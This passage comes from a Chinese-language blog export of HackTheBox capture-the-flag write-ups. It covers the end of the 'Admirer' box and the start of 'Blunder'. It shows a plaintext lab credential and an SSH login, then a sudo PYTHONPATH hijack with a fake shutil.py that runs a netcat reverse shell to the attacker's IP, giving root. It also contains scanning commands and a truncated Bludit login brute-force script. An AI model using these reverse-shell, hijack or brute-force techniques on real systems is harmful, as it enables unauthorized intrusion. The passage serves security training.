class="string">&#x27;                                        &lt;div class=\&quot;fields\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                            &lt;div class=\&quot;field half\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                                &lt;input type=\&quot;text\&quot; name=\&quot;name\&quot; id=\&quot;name\&quot; placeholder=\&quot;Name\&quot; /&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                            &lt;/div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                            &lt;div class=\&quot;field half\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                                &lt;input type=\&quot;text\&quot; name=\&quot;email\&quot; id=\&quot;email\&quot; placeholder=\&quot;Email\&quot; /&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                            &lt;/div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                            &lt;div class=\&quot;field\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                                &lt;textarea name=\&quot;message\&quot; id=\&quot;message\&quot; rows=\&quot;4\&quot; placeholder=\&quot;Message\&quot;&gt;&lt;/textarea&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                            &lt;/div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                        &lt;/div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                        &lt;ul class=\&quot;actions\&quot;&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                            &lt;li&gt;&lt;input type=\&quot;submit\&quot; value=\&quot;Send\&quot; class=\&quot;primary\&quot; /&gt;&lt;/li&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                            &lt;li&gt;&lt;input type=\&quot;reset\&quot; value=\&quot;Reset\&quot; /&gt;&lt;/li&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                        &lt;/ul&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                    &lt;/form&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                                &lt;/section&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                            &lt;/div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                        &lt;/div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;                    &lt;/footer&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;            &lt;/div&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;        &lt;!-- Scripts --&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;            &lt;script src=\&quot;assets/js/jquery.min.js\&quot;&gt;&lt;/script&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;            &lt;script src=\&quot;assets/js/jquery.poptrox.min.js\&quot;&gt;&lt;/script&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;            &lt;script src=\&quot;assets/js/browser.min.js\&quot;&gt;&lt;/script&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;            &lt;script src=\&quot;assets/js/breakpoints.min.js\&quot;&gt;&lt;/script&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;            &lt;script src=\&quot;assets/js/util.js\&quot;&gt;&lt;/script&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;            &lt;script src=\&quot;assets/js/main.js\&quot;&gt;&lt;/script&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;    &lt;/body&gt;&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;&lt;/html&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">-- <span class="number">2020</span><span class="number">-09</span><span class="number">-05</span> <span class="number">08</span>:<span class="number">07</span>:<span class="number">51</span></span><br></pre></td></tr></table></figure>

<p><code>æ‰¾åˆ°ç”¨æˆ·åä¸å¯†ç </code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$servername</span> = \&quot;localhost\&quot;;</span><br><span class="line"><span class="variable">$username</span> = \&quot;waldo\&quot;;<span class="string">&#x27;),</span></span><br><span class="line"><span class="string">$password = \&quot;&amp;&lt;h5b~yK3F#&#123;PaPB&amp;dA&#125;&#123;H&gt;\&quot;;</span></span><br><span class="line"><span class="string">$dbname = \&quot;admirerdb\&quot;;</span></span><br></pre></td></tr></table></figure>

<h2 id="0x08-sshç™»å…¥"><a href="#0x08-sshç™»å…¥" class="headerlink" title="0x08.sshç™»å…¥"></a>0x08.sshç™»å…¥</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/admirer<span class="comment"># cat user </span></span><br><span class="line">waldo   &amp;&lt;h5b~yK3F<span class="comment">#&#123;PaPB&amp;dA&#125;&#123;H&gt;</span></span><br><span class="line">root@JIYE:~/htb/admirer<span class="comment"># ssh waldo@10.10.10.187</span></span><br><span class="line">waldo@10.10.10.187<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Devuan GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">You have new mail.</span></span><br><span class="line"><span class="string">Last login: Sat Sep  5 09:06:54 2020 from 10.10.14.80</span></span><br><span class="line"><span class="string">waldo@admirer:~$ </span></span><br></pre></td></tr></table></figure>

<p><code>æ‰¾åˆ°flag</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">waldo@admirer:~$ ls</span><br><span class="line"><span class="built_in">test</span>  user.txt</span><br><span class="line">waldo@admirer:~$ cat user.txt </span><br><span class="line">*******************************</span><br><span class="line">waldo@admirer:~$</span><br></pre></td></tr></table></figure>

<h2 id="0x09-ææƒ"><a href="#0x09-ææƒ" class="headerlink" title="0x09.ææƒ"></a>0x09.ææƒ</h2><blockquote>
<p>/opt/scripts/admin_tasks.shå¯ä»¥ç”¨æ¥ææƒ</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">waldo@admirer:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> waldo: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> waldo on admirer:</span><br><span class="line">    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always</span><br><span class="line"></span><br><span class="line">User waldo may run the following commands on admirer:</span><br><span class="line">    (ALL) SETENV: /opt/scripts/admin_tasks.sh</span><br><span class="line">waldo@admirer:~$</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æŸ¥çœ‹æ­¤è„šæœ¬ï¼Œå‘ç°æ­¤è„šæœ¬ç”¨æ¥å¤‡ä»½æ•°æ®</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">waldo@admirer:/opt/scripts$ ls</span><br><span class="line">admin_tasks.sh  backup.py</span><br><span class="line">waldo@admirer:/opt/scripts$ cat admin_tasks.sh </span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">view_uptime()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/uptime -p</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">view_users()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/w</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">view_crontab()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/crontab -l</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_passwd()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Backing up /etc/passwd to /var/backups/passwd.bak...&quot;</span></span><br><span class="line">        /bin/cp /etc/passwd /var/backups/passwd.bak</span><br><span class="line">        /bin/chown root:root /var/backups/passwd.bak</span><br><span class="line">        /bin/chmod 600 /var/backups/passwd.bak</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Done.&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_shadow()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Backing up /etc/shadow to /var/backups/shadow.bak...&quot;</span></span><br><span class="line">        /bin/cp /etc/shadow /var/backups/shadow.bak</span><br><span class="line">        /bin/chown root:shadow /var/backups/shadow.bak</span><br><span class="line">        /bin/chmod 600 /var/backups/shadow.bak</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Done.&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_web()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Running backup script in the background, it might take a while...&quot;</span></span><br><span class="line">        /opt/scripts/backup.py &amp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_db()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Running mysqldump in the background, it may take a while...&quot;</span></span><br><span class="line">        <span class="comment">#/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp;</span></span><br><span class="line">        /usr/bin/mysqldump -u root admirerdb &gt; /var/backups/dump.sql &amp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Non-interactive way, to be used by the web interface</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq 1 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    option=<span class="variable">$1</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$option</span> <span class="keyword">in</span></span><br><span class="line">        1) view_uptime ;;</span><br><span class="line">        2) view_users ;;</span><br><span class="line">        3) view_crontab ;;</span><br><span class="line">        4) backup_passwd ;;</span><br><span class="line">        5) backup_shadow ;;</span><br><span class="line">        6) backup_web ;;</span><br><span class="line">        7) backup_db ;;</span><br><span class="line"></span><br><span class="line">        *) <span class="built_in">echo</span> <span class="string">&quot;Unknown option.&quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive way, to be called from the command line</span></span><br><span class="line">options=(<span class="string">&quot;View system uptime&quot;</span></span><br><span class="line">         <span class="string">&quot;View logged in users&quot;</span></span><br><span class="line">         <span class="string">&quot;View crontab&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup passwd file&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup shadow file&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup web data&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup DB&quot;</span></span><br><span class="line">         <span class="string">&quot;Quit&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[[[ System Administration Menu ]]]&quot;</span></span><br><span class="line">PS3=<span class="string">&quot;Choose an option: &quot;</span></span><br><span class="line">COLUMNS=11</span><br><span class="line">select opt <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;options[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$REPLY</span> <span class="keyword">in</span></span><br><span class="line">        1) view_uptime ; <span class="built_in">break</span> ;;</span><br><span class="line">        2) view_users ; <span class="built_in">break</span> ;;</span><br><span class="line">        3) view_crontab ; <span class="built_in">break</span> ;;</span><br><span class="line">        4) backup_passwd ; <span class="built_in">break</span> ;;</span><br><span class="line">        5) backup_shadow ; <span class="built_in">break</span> ;;</span><br><span class="line">        6) backup_web ; <span class="built_in">break</span> ;;</span><br><span class="line">        7) backup_db ; <span class="built_in">break</span> ;;</span><br><span class="line">        8) <span class="built_in">echo</span> <span class="string">&quot;Bye!&quot;</span> ; <span class="built_in">break</span> ;;</span><br><span class="line"></span><br><span class="line">        *) <span class="built_in">echo</span> <span class="string">&quot;Unknown option.&quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">waldo@admirer:/opt/scripts$</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æŸ¥çœ‹backup.pyï¼Œå‘ç°æ­¤è„šæœ¬ç”¨æ¥å°†/var/www/html/å¤‡ä»½åˆ°ftpç›®å½•ä¸‹çš„/var/backups/htmlï¼Œå¹¶å‹ç¼©ã€‚</p>
<p>ä¸¤ä¸ªè„šæœ¬ä¸€èµ·åˆ†æä¸ºï¼Œè¿è¡Œadmin_tasks.shå°†è°ƒç”¨backup.pyå¤‡ä»½æ•°æ®ã€‚</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">waldo@admirer:/opt/scripts$ cat backup.py </span><br><span class="line"><span class="meta">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line">from shutil import make_archive</span><br><span class="line"></span><br><span class="line">src = <span class="string">&#x27;/var/www/html/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># old ftp directory, not used anymore</span></span><br><span class="line"><span class="comment">#dst = &#x27;/srv/ftp/html&#x27;</span></span><br><span class="line"></span><br><span class="line">dst = <span class="string">&#x27;/var/backups/html&#x27;</span></span><br><span class="line"></span><br><span class="line">make_archive(dst, <span class="string">&#x27;gztar&#x27;</span>, src)</span><br><span class="line">waldo@admirer:/opt/scripts$</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å°è¯•ä¿®æ”¹backup.shï¼Œä½†æ˜¯æ²¡æœ‰æƒé™ã€‚</p>
<p>é‡æ–°åˆ›å»ºbackup.shï¼Œå¹¶ä¿®æ”¹pythonè°ƒç”¨è·¯å¾„ã€‚</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">waldo@admirer:~$ mkdir fjy</span><br><span class="line">waldo@admirer:~$ <span class="built_in">cd</span> fjy</span><br><span class="line">waldo@admirer:~/fjy$ cat shutil.py </span><br><span class="line">import os</span><br><span class="line">def make_archive(x,y,z):</span><br><span class="line">    os.system(<span class="string">&quot;nc 10.10.17.216 6666 -e &#x27;/bin/bash&#x27;&quot;</span>)</span><br><span class="line">waldo@admirer:~/fjy$</span><br></pre></td></tr></table></figure>

<p><code>kaliç›‘å¬</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>æ‰§è¡Œ</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">waldo@admirer:~/fjy$ sudo PYTHONPATH=~/fjy /opt/scripts/admin_tasks.sh </span><br><span class="line">[sudo] password <span class="keyword">for</span> waldo: </span><br><span class="line"></span><br><span class="line">[[[ System Administration Menu ]]]</span><br><span class="line">1) View system uptime</span><br><span class="line">2) View logged <span class="keyword">in</span> users</span><br><span class="line">3) View crontab</span><br><span class="line">4) Backup passwd file</span><br><span class="line">5) Backup shadow file</span><br><span class="line">6) Backup web data</span><br><span class="line">7) Backup DB</span><br><span class="line">8) Quit</span><br><span class="line">Choose an option:</span><br></pre></td></tr></table></figure>

<p><code>é€‰æ‹©6</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Choose an option: 6</span><br><span class="line">Running backup script <span class="keyword">in</span> the background, it might take a <span class="keyword">while</span>...</span><br><span class="line">waldo@admirer:~/fjy$</span><br></pre></td></tr></table></figure>

<p><code>kaliå¾—åˆ°shell</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.187] 38682</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> </span><br><span class="line">root@admirer:/home/waldo/fjy<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@admirer:/home/waldo/fjy<span class="comment"># ^Z</span></span><br><span class="line">[1]+  å·²åœæ­¢               nc -nvlp 6666</span><br><span class="line">root@JIYE:~<span class="comment"># stty raw -echo</span></span><br><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line"></span><br><span class="line">root@admirer:/home/waldo/fjy<span class="comment"># ls</span></span><br><span class="line">shutil.py</span><br><span class="line">root@admirer:/home/waldo/fjy<span class="comment"># cd</span></span><br><span class="line">root@admirer:~<span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@admirer:~<span class="comment"># cat root.txt </span></span><br><span class="line">*******************************</span><br><span class="line">root@admirer:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-[blunder]</title>
    <url>/2020/09/19/HTB-blunder/</url>
    <content><![CDATA[<h2 id="0x01-æ¦‚è¿°"><a href="#0x01-æ¦‚è¿°" class="headerlink" title="0x01.æ¦‚è¿°"></a>0x01.æ¦‚è¿°</h2><img src="/2020/09/19/HTB-blunder/image-20200918203836239.png" class>

<a id="more"></a>

<h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>ä»…ä»…å¼€æ”¾äº†21ï¼ˆå…³é—­ï¼‰/80ç«¯å£</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/blunder<span class="comment"># nmap -sC -sV -sT 10.10.10.191 -oN nmap.CVT</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-18 08:32 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.191</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE  SERVICE VERSION</span><br><span class="line">21/tcp closed ftp</span><br><span class="line">80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-generator: Blunder</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Blunder | A blunder of interesting facts</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 74.98 seconds</span><br><span class="line">root@JIYE:~/htb/blunder<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x01-å…ˆè®¿é—®80ç«¯å£"><a href="#0x01-å…ˆè®¿é—®80ç«¯å£" class="headerlink" title="0x01.å…ˆè®¿é—®80ç«¯å£"></a>0x01.å…ˆè®¿é—®80ç«¯å£</h2><p><code>æ‰‹åŠ¨çˆ¬è™«æ— æœ</code></p>
<img src="/2020/09/19/HTB-blunder/image-20200918211814780.png" class>

<h2 id="0x03-æ‰«æéšè—ç›®å½•"><a href="#0x03-æ‰«æéšè—ç›®å½•" class="headerlink" title="0x03.æ‰«æéšè—ç›®å½•"></a>0x03.æ‰«æéšè—ç›®å½•</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/blunder<span class="comment"># gobuster dir -u http://10.10.10.191 -w /usr/share/wordlists/dirb/common.txt -x txt,php,py,cgi</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://10.10.10.191</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     cgi,txt,php,py</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2020/09/18 20:46:19 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/.hta (Status: 403)</span><br><span class="line">/.hta.txt (Status: 403)</span><br><span class="line">/.hta.php (Status: 403)</span><br><span class="line">/.hta.py (Status: 403)</span><br><span class="line">/.hta.cgi (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.htaccess.txt (Status: 403)</span><br><span class="line">/.htaccess.php (Status: 403)</span><br><span class="line">/.htaccess.py (Status: 403)</span><br><span class="line">/.htaccess.cgi (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htpasswd.cgi (Status: 403)</span><br><span class="line">/.htpasswd.txt (Status: 403)</span><br><span class="line">/.htpasswd.php (Status: 403)</span><br><span class="line">/.htpasswd.py (Status: 403)</span><br><span class="line">/0 (Status: 200)</span><br><span class="line">/about (Status: 200)</span><br><span class="line">/admin (Status: 301)</span><br><span class="line">[ERROR] 2020/09/18 20:49:18 [!] net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> reading body)</span><br><span class="line">[ERROR] 2020/09/18 20:49:18 [!] Get http://10.10.10.191/AT-admin.cgi.py: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/at.py: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/attach.py: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/attachs: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/atom.php: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/attach_mod.txt: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/attachment.txt: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/attic: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/attachments.txt: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">/cgi-bin/ (Status: 301)</span><br><span class="line">/install.php (Status: 200)</span><br><span class="line">/LICENSE (Status: 200)</span><br><span class="line">/robots.txt (Status: 200)</span><br><span class="line">/robots.txt (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/todo.txt (Status: 200)</span><br><span class="line">===============================================================</span><br><span class="line">2020/09/18 21:13:55 Finished</span><br><span class="line">===============================================================</span><br><span class="line">root@JIYE:~/htb/blunder<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x04-æµè§ˆéšè—æ–‡ä»¶"><a href="#0x04-æµè§ˆéšè—æ–‡ä»¶" class="headerlink" title="0x04.æµè§ˆéšè—æ–‡ä»¶"></a>0x04.æµè§ˆéšè—æ–‡ä»¶</h2><p><code>æ„Ÿè§‰fergusåº”è¯¥æ˜¯ä¸€ä¸ªç”¨æˆ·</code></p>
<img src="/2020/09/19/HTB-blunder/image-20200919091017554.png" class>

<img src="/2020/09/19/HTB-blunder/image-20200919091105055.png" class>

<h2 id="0x05-è®¿é—®admin"><a href="#0x05-è®¿é—®admin" class="headerlink" title="0x05.è®¿é—®admin"></a>0x05.è®¿é—®admin</h2><p><code>å‘ç°ä¸ºBLUDIT CMS</code></p>
<img src="/2020/09/19/HTB-blunder/image-20200919091142052.png" class>

<h2 id="0x06-ç”Ÿæˆç‰¹å®šå­—å…¸"><a href="#0x06-ç”Ÿæˆç‰¹å®šå­—å…¸" class="headerlink" title="0x06.ç”Ÿæˆç‰¹å®šå­—å…¸"></a>0x06.ç”Ÿæˆç‰¹å®šå­—å…¸</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/blunder<span class="comment"># cewl -w wordlist.txt -d 10 -m 7 http://10.10.10.191</span></span><br><span class="line">CeWL <span class="number">5.4</span><span class="number">.8</span> (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br><span class="line">root@JIYE:~/htb/blunder<span class="comment"># wc -l wordlist.txt </span></span><br><span class="line"><span class="number">142</span> wordlist.txt</span><br><span class="line">root@JIYE:~/htb/blunder<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x07-çˆ†ç ´"><a href="#0x07-çˆ†ç ´" class="headerlink" title="0x07.çˆ†ç ´"></a>0x07.çˆ†ç ´</h2><p><a href="https://github.com/lunamoore/buldit-brute-force/blob/master/exp.py"><strong>bruteæºç </strong></a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/blunder<span class="comment"># cat pass.py </span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://10.10.10.191&#x27;</span></span><br><span class="line">login_url = host + <span class="string">&#x27;/admin/login&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;fergus&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;/root/htb/blunder/wordlist.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create a list (&#x27;wordlist&#x27;) using the readlines method</span></span><br><span class="line"><span class="keyword">with</span> open(filename, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;8859&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    wordlist = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(wordlist)):</span><br><span class="line">        wordlist[i] = wordlist[i].rstrip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate 50 incorrect passwords (not necessary. probably.)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    wordlist.append(<span class="string">&#x27;Password&#123;i&#125;&#x27;</span>.format(i = i))</span><br><span class="line">  <span class="comment">#  print(wordlist)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add the correct password to the end of the list (not really necessary in our use case)</span></span><br><span class="line">wordlist.append(<span class="string">&#x27;adminadmin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> wordlist:</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    login_page = session.get(login_url)</span><br><span class="line">    csrf_token = re.search(<span 